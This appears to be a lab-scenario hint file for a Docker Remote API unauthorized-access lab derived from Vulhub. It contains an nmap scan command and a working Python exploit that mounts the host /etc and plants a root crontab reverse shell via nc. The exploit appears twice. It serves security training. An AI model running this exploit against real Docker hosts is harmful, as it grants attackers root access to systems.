@@ -1,0 +1,99 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: docker/unauthorized-rce
+hint_levels:
+  low:
+  - Inspect the docker service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 2375. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 2375 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): docker: 2375/tcp → container 2375/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:2375/`.'
+  high:
+  - 'Vulnerability: Docker Remote API Unauthorized Access Leads to Remote Code Execution.'
+  - |-
+    Vulnerability Reproduction
+
+    The vulnerability can be exploited using Python with the docker-py library. The attack involves creating a new container that mounts the host's /etc directory, allowing an attacker to modify critical system files. In this example, we will demonstrate the vulnerability by adding a malicious crontab entry that creates a reverse shell.
+
+    First, install the required Python library:
+
+    ```
+    pip install docker
+    ```
+
+    Then create and run a Python script that exploits the vulnerability:
+
+    ```python
+    import docker
+
+    client = docker.DockerClient(base_url='http://{{NODE_IP}}:2375/')
+    data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc {{NODE_IP}} 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
+    ```
+
+    The script creates a container that mounts the host's /etc directory and adds a reverse shell command to the root user's crontab. Within a minute, the cron daemon will execute the command, establishing a reverse shell connection to the attacker's machine.
+
+    The successful exploitation can be verified by receiving the reverse shell connection:
+
+    Reverse Shell Exploitation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/docker/unauthorized-rce/1.png
+
+    This vulnerability demonstrates the critical importance of properly securing Docker daemon access and implementing authentication mechanisms for remote API endpoints.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/docker/unauthorized-rce/README.md'
+  - |-
+    Additional public references:
+    - https://docs.docker.com/engine/security/protect-access/
+    - https://tttang.com/archive/357/
+access_instructions:
+  title: Docker Remote API Unauthorized Access Leads to Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 2375. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 2375 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): docker: 2375/tcp → container 2375/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:2375/`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      The vulnerability can be exploited using Python with the docker-py library. The attack involves creating a new container that mounts the host's /etc directory, allowing an attacker to modify critical system files. In this example, we will demonstrate the vulnerability by adding a malicious crontab entry that creates a reverse shell.
+
+      First, install the required Python library:
+
+      ```
+      pip install docker
+      ```
+
+      Then create and run a Python script that exploits the vulnerability:
+
+      ```python
+      import docker
+
+      client = docker.DockerClient(base_url='http://{{NODE_IP}}:2375/')
+      data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc {{NODE_IP}} 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
+      ```
+
+      The script creates a container that mounts the host's /etc directory and adds a reverse shell command to the root user's crontab. Within a minute, the cron daemon will execute the command, establishing a reverse shell connection to the attacker's machine.
+
+      The successful exploitation can be verified by receiving the reverse shell connection:
+
+      Reverse Shell Exploitation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/docker/unauthorized-rce/1.png
+
+      This vulnerability demonstrates the critical importance of properly securing Docker daemon access and implementing authentication mechanisms for remote API endpoints.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/docker/unauthorized-rce/README.md
+  readme_sha256: 463d7512b0f722897cc725a4b01eecf46f9b4150cc1c80cf11a7a3730e42dcb6
+  compose_sha256: 409912514d1ba0667a54b280711d89f518d16c0ee4b76cf7dcc559443bb6e8df
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
